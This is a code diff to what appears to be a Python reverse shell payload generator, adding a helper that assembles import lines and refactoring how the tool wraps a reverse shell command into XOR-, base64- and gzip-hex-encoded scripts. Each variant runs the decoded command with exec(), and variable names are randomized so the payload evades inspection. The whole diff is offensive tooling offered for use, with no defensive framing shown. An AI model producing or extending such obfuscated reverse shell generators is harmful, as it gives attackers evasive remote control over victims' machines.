@@ -82,6 +82,35 @@ def randomize_names(payload):
     return payload
 
 
+def build_payload_script(modules, from_imports, reverse_shell_payload, payload_script):
+    # Construire la chaîne de caractères contenant les imports du type "import"
+    imports = ""
+    for i, module in enumerate(modules):
+        if module not in [i[1] for i in from_imports]:
+            imports += module
+            if i == len(modules) - 1:
+                if len(from_imports) != 0:
+                    imports += ";"
+                else:
+                    imports += ""
+
+            else:
+                imports += ","
+
+    # Construire la chaîne de caractères contenant les imports du type "from import"
+    from_imports_str = ""
+    if len(from_imports) == 0:
+        from_import = ""
+    for i, from_import in enumerate(from_imports):
+        from_imports_str += "from %s import %s" % (from_import[0], from_import[1])
+        if i == len(from_imports) - 1:
+            # Ajouter un espace au dernier import
+            from_imports_str += " "
+        else:
+            from_imports_str += "\n"
+
+    payload_script = payload_script % (imports, from_imports_str, reverse_shell_payload)
+    return payload_script
 
 
 def reverse_shell_gen(host, port, infile, outfile, module):
@@ -104,7 +133,7 @@ def reverse_shell_gen(host, port, infile, outfile, module):
         for char in encoded:
             encoded_char = ord(char) ^ 0xFF
             reverse_shell_payload += chr(encoded_char)
-        payload_script = "import binascii, %s\nencoded = '" % ', '.join([module for module in modules if module not in [i[1] for i in from_imports]] + ["\nfrom %s import %s" % (i[0], i[1]) for i in from_imports]) + reverse_shell_payload +  "'\n\ndef decode_reverse_shell(encoded):\n    decoded = ''\n    for char in encoded:\n        decoded += chr(ord(char) ^ 0xFF)\n    return binascii.unhexlify(decoded).decode('utf-8') \n\nreverse_shell_command = decode_reverse_shell(encoded) \nexec(reverse_shell_command)"
+        payload_script = "import binascii,%s\nencoded = '" % ', '.join([module for module in modules if module not in [i[1] for i in from_imports]] + ["\nfrom %s import %s" % (i[0], i[1]) for i in from_imports]) + reverse_shell_payload +  "'\n\ndef decode_reverse_shell(encoded):\n    decoded = ''\n    for char in encoded:\n        decoded += chr(ord(char) ^ 0xFF)\n    return binascii.unhexlify(decoded).decode('utf-8') \n\nreverse_shell_command = decode_reverse_shell(encoded) \nexec(reverse_shell_command)"
         payload_script = randomize_names(payload_script)
         decoded_reverse_shell = binascii.unhexlify(encoded).decode('utf-8')
         
@@ -112,7 +141,10 @@ def reverse_shell_gen(host, port, infile, outfile, module):
     if module == "base64":
         text = "[+] Here Is Your Encoded Reverse Shell Payload String With Base64: \n"
         reverse_shell_payload = base64.b64encode(reverse_shell_command.encode('utf-8')).decode('utf-8')
-        payload_script = "import binascii, %s\nexec(binascii.a2b_base64(\"%s\".encode('utf8')).decode('utf8'))" % (', '.join([module for module in modules if module not in [i[1] for i in from_imports]] + ["from %s import %s" % (i[0], i[1]) for i in from_imports]), reverse_shell_payload)
+        modules = [module for module in modules if module not in [i[1] for i in from_imports]]
+        from_imports_str = [(i[0], i[1]) for i in from_imports]
+        payload_script = "import binascii,%s%s\nexec(binascii.a2b_base64(\"%s\".encode('utf8')).decode('utf8'))"
+        payload_script = build_payload_script(modules, from_imports_str, reverse_shell_payload, payload_script)
         payload_script = randomize_names(payload_script)
         payload_script = format_inline(payload_script)
         decoded_reverse_shell = binascii.a2b_base64(reverse_shell_payload.encode('utf8')).decode('utf8')
@@ -121,7 +153,10 @@ def reverse_shell_gen(host, port, infile, outfile, module):
         text = "[+] Here Is Your Encoded Reverse Shell Payload String With Gzip + Hex: \n"
         reverse_shell_payload = gzip.compress(reverse_shell_command.encode('utf-8'))
         reverse_shell_payload = binascii.b2a_hex(reverse_shell_payload).decode('utf-8')
-        payload_script = "import gzip, binascii, %s\nexec(gzip.decompress(binascii.a2b_hex(\'%s\')).decode('utf-8'))" % (', '.join([module for module in modules if module not in [i[1] for i in from_imports]] + ["from %s import %s" % (i[0], i[1]) for i in from_imports]), reverse_shell_payload)
+        modules = [module for module in modules if module not in [i[1] for i in from_imports]]
+        from_imports_str = [(i[0], i[1]) for i in from_imports]
+        payload_script = "import gzip,binascii,%s%s\nexec(gzip.decompress(binascii.a2b_hex(\'%s\')).decode('utf-8'))"
+        payload_script = build_payload_script(modules, from_imports_str, reverse_shell_payload, payload_script)
         payload_script = randomize_names(payload_script)
         payload_script = format_inline(payload_script)
         decoded_reverse_shell = gzip.decompress(binascii.a2b_hex(reverse_shell_payload)).decode('utf-8')
